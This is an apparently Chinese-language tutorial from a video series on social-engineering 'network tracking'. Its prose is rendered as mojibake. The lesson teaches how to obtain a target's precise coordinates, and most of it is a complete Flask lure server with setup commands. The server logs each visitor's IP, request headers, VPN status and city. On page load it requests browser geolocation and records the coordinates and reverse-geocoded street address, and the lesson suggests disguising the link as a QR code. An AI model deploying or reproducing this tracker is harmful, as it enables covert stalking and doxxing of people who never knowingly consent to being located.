#### è·å–å¯¹æ–¹ç»çº¬åº¦ç²¾å‡†å®šä½ |ã€Šç¤¾ä¼šå·¥ç¨‹å­¦ä¹‹ç½‘ç»œè¿½è¸ªã€‹ç¬¬ä¸‰èŠ‚

å­¦ä¼šæœ¬èŠ‚è¯¾æŠ€èƒ½ï¼Œå¯è·å–åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š

â€¢å¯¹æ–¹çš„æ‰‹æœºç”µè„‘ç­‰è®¾å¤‡å‹å·

â€¢å¯¹æ–¹ç”¨çš„ä»€ä¹ˆæµè§ˆå™¨ä»€ä¹ˆç‰ˆæœ¬

â€¢å¯¹æ–¹ç½‘ç»œIPåœ°å€ä¿¡æ¯

â€¢å¯¹æ–¹æœ‰æ²¡æœ‰å¼€VPN

â€¢å¯¹æ–¹ç”¨çš„ä»€ä¹ˆè¿è¥å•†

â€¢å¯¹æ–¹å¤§æ¦‚åœ¨å“ªä¸ªåŸå¸‚

â€¢å¯¹æ–¹çš„ç»çº¬åº¦åæ ‡

â€¢é“¾æ¥è½¬äºŒç»´ç ä¼ªè£…

****

è§†é¢‘è®²è§£ï¼šhttps://youtu.be/KPP2HhWPddk

æˆä¸ºæˆ‘çš„VIPä¼šå‘˜ï¼š https://www.youtube.com/@MeeGooBoo/join

> ä¸‰ã€ã€Šç¤¾ä¼šå·¥ç¨‹å­¦ä¹‹ç½‘ç»œè¿½è¸ªã€‹-è·å–å¯¹æ–¹ç»çº¬åº¦ç²¾å‡†å®šä½.pptx 

æœ¬èŠ‚è¯¾çš„PPTä¸‹è½½åœ°å€ï¼šhttps://github.com/MeeGooBoo/2025/blob/main/9/12/%E4%B8%89%E3%80%81%E3%80%8A%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E4%B9%8B%E7%BD%91%E7%BB%9C%E8%BF%BD%E8%B8%AA%E3%80%8B-%E8%8E%B7%E5%8F%96%E5%AF%B9%E6%96%B9%E7%BB%8F%E7%BA%AC%E5%BA%A6%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D.pptx

**ç‚¹å‡»å³ä¸Šè§’çš„ä¸‰ä¸ªç‚¹å³å¯çœ‹åˆ°ä¸‹è½½æŒ‰é’®**

****

è…¾è®¯æ„å»ºï¼šhttps://cnb.cool/

äºŒç»´ç å·¥å…·ï¼šhttps://cli.im/

IPæŸ¥è¯¢ï¼šhttps://tool.lu/ip/

ç»çº¬åº¦åæ ‡åœ°å›¾å®šä½ï¼šhttps://lbs.baidu.com/maptool/getpoint æˆ–https://bajiu.cn/ditu/?id=20676

```
apt update
```

```
apt install python3 python3-pip
```

```
pip install --break-system-packages flask requests
```

```
from flask import Flask, request, render_template_string, jsonify
import requests
import datetime
import os
import logging
import json
import math

# è®¾ç½®æ—¥å¿—
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ç”¨äºæ£€æµ‹ä»£ç†çš„IPæœåŠ¡APIï¼ˆå®é™…ä½¿ç”¨æ—¶å¯èƒ½éœ€è¦æ³¨å†Œè·å–APIå¯†é’¥ï¼‰
PROXY_CHECK_API = "http://ip-api.com/json/{ip}?fields=proxy,countryCode,city,isp&lang=zh-CN"

# å›½å®¶ä»£ç åˆ°ä¸­æ–‡åç§°çš„æ˜ å°„
COUNTRY_CODE_MAP = {
    "CN": "ä¸­å›½", "US": "ç¾å›½", "JP": "æ—¥æœ¬", "KR": "éŸ©å›½", "UK": "è‹±å›½",
    "DE": "å¾·å›½", "FR": "æ³•å›½", "RU": "ä¿„ç½—æ–¯", "IN": "å°åº¦", "BR": "å·´è¥¿",
    "CA": "åŠ æ‹¿å¤§", "AU": "æ¾³å¤§åˆ©äºš", "SG": "æ–°åŠ å¡", "TW": "å°æ¹¾", "HK": "é¦™æ¸¯",
    "MO": "æ¾³é—¨", "MY": "é©¬æ¥è¥¿äºš", "TH": "æ³°å›½", "VN": "è¶Šå—", "ID": "å°åº¦å°¼è¥¿äºš",
    "PH": "è²å¾‹å®¾", "MM": "ç¼…ç”¸", "KH": "æŸ¬åŸ”å¯¨", "LA": "è€æŒ", "BD": "å­ŸåŠ æ‹‰å›½",
    "NP": "å°¼æ³Šå°”", "PK": "å·´åŸºæ–¯å¦", "LK": "æ–¯é‡Œå…°å¡", "SA": "æ²™ç‰¹é˜¿æ‹‰ä¼¯",
    "AE": "é˜¿è”é…‹", "TR": "åœŸè€³å…¶", "IL": "ä»¥è‰²åˆ—", "EG": "åŸƒåŠ", "ZA": "å—é",
    "NG": "å°¼æ—¥åˆ©äºš", "KE": "è‚¯å°¼äºš", "ET": "åŸƒå¡ä¿„æ¯”äºš", "MA": "æ‘©æ´›å“¥"
}

# åæ ‡ç³»è½¬æ¢å‡½æ•°
def wgs84_to_gcj02(lng, lat):
    """
    WGS84è½¬GCJ02(ç«æ˜Ÿåæ ‡ç³»)
    :param lng: WGS84åæ ‡ç³»çš„ç»åº¦
    :param lat: WGS84åæ ‡ç³»çš„çº¬åº¦
    :return: GCJ02åæ ‡ç³»çš„ç»çº¬åº¦
    """
    a = 6378245.0  # é•¿åŠè½´
    ee = 0.00669342162296594323  # æ‰ç‡
    
    if out_of_china(lng, lat):
        return lng, lat
    
    dlat = transform_lat(lng - 105.0, lat - 35.0)
    dlng = transform_lng(lng - 105.0, lat - 35.0)
    
    radlat = lat / 180.0 * math.pi
    magic = math.sin(radlat)
    magic = 1 - ee * magic * magic
    sqrtmagic = math.sqrt(magic)
    
    dlat = (dlat * 180.0) / ((a * (1 - ee)) / (magic * sqrtmagic) * math.pi)
    dlng = (dlng * 180.0) / (a / sqrtmagic * math.cos(radlat) * math.pi)
    
    mglat = lat + dlat
    mglng = lng + dlng
    
    return mglng, mglat

def out_of_china(lng, lat):
    """
    åˆ¤æ–­æ˜¯å¦åœ¨å›½å†…ï¼Œä¸åœ¨å›½å†…ä¸åšåç§»
    :param lng: ç»åº¦
    :param lat: çº¬åº¦
    :return: æ˜¯å¦åœ¨å›½å¤–
    """
    if lng < 72.004 or lng > 137.8347:
        return True
    if lat < 0.8293 or lat > 55.8271:
        return True
    return False

def transform_lat(lng, lat):
    ret = -100.0 + 2.0 * lng + 3.0 * lat + 0.2 * lat * lat + 0.1 * lng * lat + 0.2 * math.sqrt(abs(lng))
    ret += (20.0 * math.sin(6.0 * lng * math.pi) + 20.0 * math.sin(2.0 * lng * math.pi)) * 2.0 / 3.0
    ret += (20.0 * math.sin(lat * math.pi) + 40.0 * math.sin(lat / 3.0 * math.pi)) * 2.0 / 3.0
    ret += (160.0 * math.sin(lat / 12.0 * math.pi) + 320 * math.sin(lat * math.pi / 30.0)) * 2.0 / 3.0
    return ret

def transform_lng(lng, lat):
    ret = 300.0 + lng + 2.0 * lat + 0.1 * lng * lng + 0.1 * lng * lat + 0.1 * math.sqrt(abs(lng))
    ret += (20.0 * math.sin(6.0 * lng * math.pi) + 20.0 * math.sin(2.0 * lng * math.pi)) * 2.0 / 3.0
    ret += (20.0 * math.sin(lng * math.pi) + 40.0 * math.sin(lng / 3.0 * math.pi)) * 2.0 / 3.0
    ret += (150.0 * math.sin(lng / 12.0 * math.pi) + 300.0 * math.sin(lng / 30.0 * math.pi)) * 2.0 / 3.0
    return ret

def check_ip_proxy_and_location(ip):
    """
    æ£€æŸ¥IPæ˜¯å¦ä¸ºä»£ç†/VPNå¹¶è·å–å½’å±åœ°ä¿¡æ¯
    è¿”å›æ ¼å¼: (is_proxy, location_str)
    """
    try:
        # è·³è¿‡æœ¬åœ°IPæ£€æŸ¥
        if ip.startswith(('127.', '10.', '172.', '192.')) or ip == 'localhost' or ip == '::1':
            return False, "æœ¬åœ°ç½‘ç»œ"
            
        response = requests.get(PROXY_CHECK_API.format(ip=ip), timeout=5)
        data = response.json()
        
        # æ£€æŸ¥æ˜¯å¦æ˜¯ä»£ç†
        is_proxy = data.get('proxy', False) or data.get('hosting', False)
        
        # è·å–å›½å®¶ä»£ç å¹¶è½¬æ¢ä¸ºä¸­æ–‡
        country_code = data.get('countryCode', '')
        country = COUNTRY_CODE_MAP.get(country_code, country_code)
        
        # è·å–å…¶ä»–ä¿¡æ¯
        city = data.get('city', 'æœªçŸ¥')
        isp = data.get('isp', 'æœªçŸ¥')
        
        # æ„å»ºä½ç½®å­—ç¬¦ä¸²
        location = f"{country} {city} {isp}"
        
        return is_proxy, location
    except Exception as e:
        logger.error(f"æŸ¥è¯¢IPä¿¡æ¯å‡ºé”™: {e}")
        return False, "æœªçŸ¥ä½ç½®"

def get_client_ip():
    """è·å–å®¢æˆ·ç«¯çœŸå®IPåœ°å€"""
    # å°è¯•ä»å„ç§å¯èƒ½çš„å¤´éƒ¨è·å–çœŸå®IP
    headers_to_check = [
        'X-Forwarded-For',
        'X-Real-IP',
        'X-Client-IP',
        'CF-Connecting-IP',  # Cloudflare
        'True-Client-IP',
        'X-Cluster-Client-IP',
        'Forwarded',
        'Via'
    ]
    
    for header in headers_to_check:
        ip = request.headers.get(header)
        if ip:
            # å¤„ç†å¤šä¸ªIPçš„æƒ…å†µï¼ˆå¦‚X-Forwarded-For: client, proxy1, proxy2ï¼‰
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            if ip and ip not in ['127.0.0.1', '::1', 'localhost']:
                logger.info(f"ä»å¤´éƒ¨ {header} è·å–åˆ°IP: {ip}")
                return ip
    
    # å¦‚æœæ‰€æœ‰å¤´éƒ¨éƒ½æ²¡æœ‰ï¼Œä½¿ç”¨remote_addr
    ip = request.remote_addr
    logger.info(f"ä½¿ç”¨remote_addrè·å–IP: {ip}")
    return ip

def get_all_headers():
    """è·å–æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯"""
    headers = {}
    for key, value in request.headers:
        headers[key] = value
    return headers

def save_to_file(ip, is_proxy, location, headers, gps_data=None):
    """å°†ç»“æœä¿å­˜åˆ°txtæ–‡ä»¶ï¼ŒåŒ…æ‹¬è¯·æ±‚å¤´ä¿¡æ¯å’ŒGPSæ•°æ®"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    proxy_status = "ä»£ç†IP" if is_proxy else "çœŸå®IP"
    
    # æ„å»ºæ—¥å¿—æ¡ç›®
    log_entry = f"{timestamp} | {ip} | {proxy_status} | {location}\n"
    
    # æ·»åŠ GPSæ•°æ®ï¼ˆå¦‚æœæœ‰ï¼‰
    if gps_data:
        log_entry += f"GPSä½ç½®: çº¬åº¦ {gps_data.get('latitude', 'æœªçŸ¥')}, ç»åº¦ {gps_data.get('longitude', 'æœªçŸ¥')}\n"
        log_entry += f"GPSç²¾åº¦: {gps_data.get('accuracy', 'æœªçŸ¥')}ç±³\n"
        if 'original_lat' in gps_data and 'original_lng' in gps_data:
            log_entry += f"åŸå§‹åæ ‡: çº¬åº¦ {gps_data['original_lat']}, ç»åº¦ {gps_data['original_lng']}\n"
        if 'address' in gps_data:
            log_entry += f"GPSåœ°å€: {gps_data['address']}\n"
        if 'coordinate_system' in gps_data:
            log_entry += f"åæ ‡ç³»: {gps_data['coordinate_system']}\n"
    
    # æ·»åŠ è¯·æ±‚å¤´ä¿¡æ¯
    log_entry += "è¯·æ±‚å¤´ä¿¡æ¯:\n"
    for key, value in headers.items():
        log_entry += f"  {key}: {value}\n"
    log_entry += "-" * 50 + "\n"
    
    # å†™å…¥æ–‡ä»¶
    with open("ip_access_log.txt", "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    return log_entry

# HTMLæ¨¡æ¿
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IPä¿¡æ¯æŸ¥è¯¢</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 700px;
            width: 100%;
            transition: transform 0.3s ease;
        }
        .container:hover {
            transform: translateY(-5px);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 30px;
            font-weight: 600;
            border-bottom: 2px solid #eee;
            padding-bottom: 15px;
        }
        .info-grid {
            display: grid;
            grid-template-columns: 120px 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }
        .info-label {
            font-weight: bold;
            color: #555;
            text-align: right;
            padding-right: 15px;
        }
        .info-value {
            color: #333;
            word-break: break-all;
        }
        .ip-type {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            margin-top: 5px;
        }
        .proxy {
            background-color: #ffebee;
            color: #c62828;
        }
        .real {
            background-color: #e8f5e9;
            color: #2e7d32;
        }
        .timestamp {
            text-align: center;
            color: #7f8c8d;
            margin-top: 30px;
            font-size: 0.9em;
            border-top: 1px solid #eee;
            padding-top: 15px;
        }
        .request-headers {
            margin-top: 30px;
            background-color: #f9f9f9;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 0.85em;
            max-height: 200px;
            overflow-y: auto;
        }
        .request-headers h3 {
            margin-top: 0;
            color: #555;
        }
        .gps-section {
            margin-top: 20px;
            padding: 15px;
            background-color: #e3f2fd;
            border-radius: 8px;
            border-left: 4px solid #2196F3;
        }
        .gps-data {
            margin-top: 10px;
            font-family: monospace;
            background-color: rgba(255, 255, 255, 0.7);
            padding: 10px;
            border-radius: 4px;
        }
        .gps-loading {
            color: #2196F3;
            font-style: italic;
        }
        .gps-error {
            color: #f44336;
        }
        .gps-success {
            color: #4caf50;
        }
        .coordinate-note {
            font-size: 0.8em;
            color: #666;
            margin-top: 5px;
        }
    </style>
</head>
<body onload="requestLocation()">
    <div class="container">
        <h1>IPä¿¡æ¯æŸ¥è¯¢ç»“æœ</h1>
        
        <div class="info-grid">
            <div class="info-label">IPåœ°å€:</div>
            <div class="info-value">{{ ip }}</div>
            
            <div class="info-label">IPç±»å‹:</div>
            <div class="info-value">
                <span class="ip-type {{ 'proxy' if is_proxy else 'real' }}">
                    {% if is_proxy %}ä»£ç†IP{% else %}çœŸå®IP{% endif %}
                </span>
            </div>
            
            <div class="info-label">åœ°ç†ä½ç½®:</div>
            <div class="info-value">{{ location }}</div>
            
            <div class="info-label">æ£€æµ‹æ—¶é—´:</div>
            <div class="info-value">{{ timestamp }}</div>
        </div>
        
        <div class="gps-section">
            <h3>GPSä½ç½®ä¿¡æ¯</h3>
            <div id="gps-status" class="gps-loading">æ­£åœ¨è¯·æ±‚åœ°ç†ä½ç½®æƒé™...</div>
            <div id="gps-result" class="gps-data"></div>
            <div class="coordinate-note">
                æ³¨ï¼šä¸ºæé«˜å®šä½ç²¾åº¦ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å°†WGS-84åæ ‡è½¬æ¢ä¸ºGCJ-02åæ ‡ç³»ï¼ˆç«æ˜Ÿåæ ‡ç³»ï¼‰
            </div>
        </div>
        
        <div class="request-headers">
            <h3>è¯·æ±‚å¤´ä¿¡æ¯ (ç”¨äºè°ƒè¯•):</h3>
            {% for header, value in headers.items() %}
                <div><strong>{{ header }}:</strong> {{ value }}</div>
            {% endfor %}
        </div>
        
        <div class="timestamp">
            ç³»ç»Ÿè¿è¡ŒäºDockerå®¹å™¨ | {{ hostname }}
        </div>
    </div>

    <script>
        function requestLocation() {
            const statusDiv = document.getElementById('gps-status');
            const resultDiv = document.getElementById('gps-result');
            
            if (!navigator.geolocation) {
                statusDiv.innerHTML = "æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒåœ°ç†ä½ç½®API";
                statusDiv.className = "gps-error";
                return;
            }
            
            statusDiv.innerHTML = "æ­£åœ¨è¯·æ±‚åœ°ç†ä½ç½®æƒé™...";
            
            // è‡ªåŠ¨è¯·æ±‚åœ°ç†ä½ç½®
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // æˆåŠŸè·å–ä½ç½®
                    statusDiv.innerHTML = "åœ°ç†ä½ç½®è·å–æˆåŠŸ";
                    statusDiv.className = "gps-success";
                    
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // æ˜¾ç¤ºä½ç½®ä¿¡æ¯
                    resultDiv.innerHTML = `
                        <strong>åŸå§‹åæ ‡ (WGS-84):</strong><br>
                        çº¬åº¦: ${latitude.toFixed(6)}<br>
                        ç»åº¦: ${longitude.toFixed(6)}<br>
                        <strong>ç²¾åº¦:</strong> ${accuracy}ç±³<br>
                    `;
                    
                    // å‘é€åˆ°æœåŠ¡å™¨è®°å½•ï¼ŒåŒ…æ‹¬åŸå§‹åæ ‡
                    sendToServer(latitude, longitude, accuracy, 'WGS-84');
                    
                    // è‡ªåŠ¨è·å–è½¬æ¢åçš„åæ ‡å’Œåœ°å€ä¿¡æ¯
                    setTimeout(() => {
                        getConvertedCoordinates(latitude, longitude, accuracy);
                    }, 500);
                },
                function(error) {
                    // è·å–ä½ç½®å¤±è´¥
                    let errorMessage;
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = "ç”¨æˆ·æ‹’ç»äº†ä½ç½®è¯·æ±‚";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = "æ— æ³•è·å–ä½ç½®ä¿¡æ¯";
                            break;
                        case error.TIMEOUT:
                            errorMessage = "ä½ç½®è¯·æ±‚è¶…æ—¶";
                            break;
                        default:
                            errorMessage = "æœªçŸ¥é”™è¯¯";
                    }
                    statusDiv.innerHTML = "è·å–ä½ç½®å¤±è´¥: " + errorMessage;
                    statusDiv.className = "gps-error";
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,  // å¢åŠ è¶…æ—¶æ—¶é—´
                    maximumAge: 60000
                }
            );
        }
        
        function getConvertedCoordinates(lat, lng, accuracy) {
            const resultDiv = document.getElementById('gps-result');
            const statusDiv = document.getElementById('gps-status');
            
            statusDiv.innerHTML = "æ­£åœ¨è½¬æ¢åæ ‡ç³»...";
            
            // è¯·æ±‚æœåŠ¡å™¨è½¬æ¢åæ ‡ç³»
            fetch(`/convert-coordinates?lat=${lat}&lng=${lng}`)
                .then(response => response.json())
                .then(data => {
                    if (data.converted_lat && data.converted_lng) {
                        resultDiv.innerHTML += `
                            <br><strong>è½¬æ¢ååæ ‡ (GCJ-02):</strong><br>
                            çº¬åº¦: ${data.converted_lat}<br>
                            ç»åº¦: ${data.converted_lng}<br>
                        `;
                        
                        // æ›´æ–°æœåŠ¡å™¨è®°å½•è½¬æ¢åçš„åæ ‡
                        fetch('/update-coordinates', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                original_lat: lat,
                                original_lng: lng,
                                converted_lat: data.converted_lat,
                                converted_lng: data.converted_lng,
                                accuracy: accuracy,
                                coordinate_system: 'GCJ-02'
                            })
                        });
                        
                        // è·å–åœ°å€ä¿¡æ¯
                        getAddress(data.converted_lat, data.converted_lng);
                    } else {
                        resultDiv.innerHTML += "<br>åæ ‡è½¬æ¢å¤±è´¥ï¼Œä½¿ç”¨åŸå§‹åæ ‡è·å–åœ°å€";
                        getAddress(lat, lng);
                    }
                })
                .catch(error => {
                    resultDiv.innerHTML += "<br>åæ ‡è½¬æ¢å¤±è´¥ï¼Œä½¿ç”¨åŸå§‹åæ ‡è·å–åœ°å€";
                    getAddress(lat, lng);
                });
        }
        
        function getAddress(lat, lng) {
            const resultDiv = document.getElementById('gps-result');
            const statusDiv = document.getElementById('gps-status');
            
            statusDiv.innerHTML = "æ­£åœ¨è·å–åœ°å€ä¿¡æ¯...";
            
            // ä½¿ç”¨é€†åœ°ç†ç¼–ç è·å–åœ°å€
            fetch(`/get-address?lat=${lat}&lng=${lng}`)
                .then(response => response.json())
                .then(data => {
                    if (data.address) {
                        resultDiv.innerHTML += `<br><strong>åœ°å€:</strong> ${data.address}`;
                        statusDiv.innerHTML = "åœ°å€ä¿¡æ¯è·å–æˆåŠŸ";
                        statusDiv.className = "gps-success";
                        
                        // æ›´æ–°æœåŠ¡å™¨ä¸Šçš„åœ°å€ä¿¡æ¯
                        fetch('/update-gps-address', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                latitude: lat,
                                longitude: lng,
                                address: data.address
                            })
                        });
                    } else {
                        resultDiv.innerHTML += "<br>æ— æ³•è·å–åœ°å€ä¿¡æ¯";
                        statusDiv.innerHTML = "æ— æ³•è·å–åœ°å€ä¿¡æ¯";
                        statusDiv.className = "gps-error";
                    }
                })
                .catch(error => {
                    resultDiv.innerHTML += "<br>è·å–åœ°å€æ—¶å‡ºé”™";
                    statusDiv.innerHTML = "è·å–åœ°å€æ—¶å‡ºé”™";
                    statusDiv.className = "gps-error";
                    console.error('Error:', error);
                });
        }
        
        function sendToServer(lat, lng, accuracy, coordinateSystem) {
            // å‘é€GPSæ•°æ®åˆ°æœåŠ¡å™¨
            fetch('/log-gps', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    latitude: lat,
                    longitude: lng,
                    accuracy: accuracy,
                    coordinate_system: coordinateSystem
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('GPSæ•°æ®å·²è®°å½•:', data);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """ä¸»è®¿é—®æ¥å£"""
    # è·å–å®¢æˆ·ç«¯IP
    ip = get_client_ip()
    
    # æ£€æŸ¥IPæ˜¯å¦ä¸ºä»£ç†å¹¶è·å–ä½ç½®ä¿¡æ¯
    is_proxy, location = check_ip_proxy_and_location(ip)
    
    # è·å–æ‰€æœ‰è¯·æ±‚å¤´
    headers = get_all_headers()
    
    # ä¿å­˜åˆ°æ–‡ä»¶ï¼ˆåŒ…æ‹¬è¯·æ±‚å¤´ä¿¡æ¯ï¼‰
    log_entry = save_to_file(ip, is_proxy, location, headers)
    
    # è·å–å½“å‰æ—¶é—´æˆ³
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # è·å–ä¸»æœºåï¼ˆç”¨äºæ˜¾ç¤ºå®¹å™¨ä¿¡æ¯ï¼‰
    hostname = os.getenv('HOSTNAME', 'æœªçŸ¥å®¹å™¨')
    
    # ä½¿ç”¨HTMLæ¨¡æ¿æ¸²æŸ“å“åº”
    return render_template_string(HTML_TEMPLATE, 
                                 ip=ip, 
                                 is_proxy=is_proxy, 
                                 location=location, 
                                 timestamp=timestamp,
                                 headers=headers,
                                 hostname=hostname)

@app.route('/log-gps', methods=['POST'])
def log_gps():
    """è®°å½•GPSä½ç½®ä¿¡æ¯"""
    try:
        data = request.get_json()
        ip = get_client_ip()
        
        # è®°å½•GPSæ•°æ®åˆ°æ—¥å¿—
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        coordinate_system = data.get('coordinate_system', 'WGS-84')
        log_entry = f"{timestamp} | {ip} | GPSä½ç½®: çº¬åº¦ {data.get('latitude')}, ç»åº¦ {data.get('longitude')}, ç²¾åº¦ {data.get('accuracy')}ç±³, åæ ‡ç³»: {coordinate_system}\n"
        
        with open("ip_access_log.txt", "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        return jsonify({"status": "success", "message": "GPSæ•°æ®å·²è®°å½•"})
    except Exception as e:
        logger.error(f"è®°å½•GPSæ•°æ®å‡ºé”™: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/update-coordinates', methods=['POST'])
def update_coordinates():
    """æ›´æ–°è½¬æ¢åçš„åæ ‡ä¿¡æ¯"""
    try:
        data = request.get_json()
        ip = get_client_ip()
        
        # æ›´æ–°æ—¥å¿—ä¸­çš„åæ ‡ä¿¡æ¯
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} | {ip} | è½¬æ¢ååæ ‡: çº¬åº¦ {data.get('converted_lat')}, ç»åº¦ {data.get('converted_lng')}, åæ ‡ç³»: {data.get('coordinate_system')}\n"
        
        with open("ip_access_log.txt", "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        return jsonify({"status": "success", "message": "åæ ‡ä¿¡æ¯å·²æ›´æ–°"})
    except Exception as e:
        logger.error(f"æ›´æ–°åæ ‡ä¿¡æ¯å‡ºé”™: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/convert-coordinates')
def convert_coordinates():
    """è½¬æ¢åæ ‡ç³»ï¼ˆWGS-84åˆ°GCJ-02ï¼‰"""
    try:
        lat = float(request.args.get('lat'))
        lng = float(request.args.get('lng'))
        
        # è½¬æ¢åæ ‡ç³»
        converted_lng, converted_lat = wgs84_to_gcj02(lng, lat)
        
        return jsonify({
            "original_lat": lat,
            "original_lng": lng,
            "converted_lat": round(converted_lat, 6),
            "converted_lng": round(converted_lng, 6)
        })
    except Exception as e:
        logger.error(f"è½¬æ¢åæ ‡å‡ºé”™: {e}")
        return jsonify({"error": str(e)})

@app.route('/update-gps-address', methods=['POST'])
def update_gps_address():
    """æ›´æ–°GPSåœ°å€ä¿¡æ¯"""
    try:
        data = request.get_json()
        ip = get_client_ip()
        
        # æ›´æ–°æ—¥å¿—ä¸­çš„åœ°å€ä¿¡æ¯
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} | {ip} | GPSåœ°å€: {data.get('address')}\n"
        
        with open("ip_access_log.txt", "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        return jsonify({"status": "success", "message": "åœ°å€ä¿¡æ¯å·²æ›´æ–°"})
    except Exception as e:
        logger.error(f"æ›´æ–°GPSåœ°å€å‡ºé”™: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get-address')
def get_address():
    """è·å–åœ°å€ä¿¡æ¯ï¼ˆé€†åœ°ç†ç¼–ç ï¼‰"""
    try:
        lat = request.args.get('lat')
        lng = request.args.get('lng')
        
        # è¿™é‡Œå¯ä»¥ä½¿ç”¨ä»»ä½•é€†åœ°ç†ç¼–ç æœåŠ¡
        # ä¾‹å¦‚ä½¿ç”¨ç™¾åº¦åœ°å›¾APIã€é«˜å¾·åœ°å›¾APIç­‰
        # ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ä½¿ç”¨OpenStreetMapçš„NominatimæœåŠ¡
        
        # æ³¨æ„ï¼šåœ¨å®é™…åº”ç”¨ä¸­ï¼Œæ‚¨å¯èƒ½éœ€è¦ä½¿ç”¨ä»˜è´¹çš„APIæœåŠ¡ä»¥è·å¾—æ›´å¥½çš„å‡†ç¡®æ€§å’Œç¨³å®šæ€§
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18&addressdetails=1"
        headers = {'User-Agent': 'IPLocationChecker/1.0 (your@email.com)'}  # å¿…é¡»è®¾ç½®User-Agent
        
        response = requests.get(url, headers=headers, timeout=10)
        data = response.json()
        
        # è§£æåœ°å€ä¿¡æ¯
        if 'display_name' in data:
            address = data['display_name']
            return jsonify({"address": address})
        else:
            return jsonify({"error": "æ— æ³•è·å–åœ°å€"})
            
    except Exception as e:
        logger.error(f"è·å–åœ°å€ä¿¡æ¯å‡ºé”™: {e}")
        return jsonify({"error": str(e)})

@app.route('/logs')
def show_logs():
    """æ˜¾ç¤ºæ—¥å¿—æ–‡ä»¶å†…å®¹"""
    try:
        with open("ip_access_log.txt", "r", encoding="utf-8") as f:
            logs = f.read()
        return f"<pre>{logs}</pre>"
    except FileNotFoundError:
        return "æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨"

if __name__ == '__main__':
    # è·å–ç«¯å£ï¼Œé»˜è®¤ä¸º5000
    port = int(os.environ.get('PORT', 5000))
    
    # å¯åŠ¨åº”ç”¨
    app.run(host='0.0.0.0', port=port, debug=False)
```





****

****

#### æ”»é˜²æ— ç»å¯¹ï¼ŒæŠ€æœ¯æ— å¥½åï¼Œåœ¨éå®‰å…¨çš„ä¿¡æ¯æ—¶ä»£ï¼Œä¼—äººçš†åœ¨å›šç¬¼ä¹‹ä¸­ï¼Œå…³æ³¨ç‰›é©¬å°è¯•ï¼Œè®©ä½ ä¸€é£å†²å¤©ï¼

****

- **Telegram(æ–‡ä»¶èµ„æºé¢‘é“)ï¼šhttps://t.me/NiuMaXiaoShi**
- **Youtubeï¼š  https://www.youtube.com/@MeeGooBoo**
- **Twitter ( X ï¼‰ï¼š  https://x.com/MeeGooBoo**

****

- ###### éœ€è¦è”ç³»æˆ‘ï¼Ÿè¯·é€šè¿‡ï¼šhttps://t.me/MeeGooBoo
- å¦‚éœ€è´­ä¹°é’»çŸ³ã€é“‚é‡‘ã€é»„é‡‘ç›¸å…³ç å®é¦–é¥°çš„ï¼Œè¯·åŠ æˆ‘å¾®ä¿¡ï¼šAioa700
- æ³¨ï¼šæœ¬äººä¸å‚ä¸ä»»ä½•æ¶‰æ”¿ç›¸å…³è®¨è®ºï¼Œæœ¬äººæ‰€æœ‰å¹³å°å’Œå†…å®¹ä»…ä¾›æŠ€æœ¯ç›¸å…³é¢†åŸŸå­¦ä¹ äº¤æµä½¿ç”¨ã€‚

****

>  [!CAUTION]
>
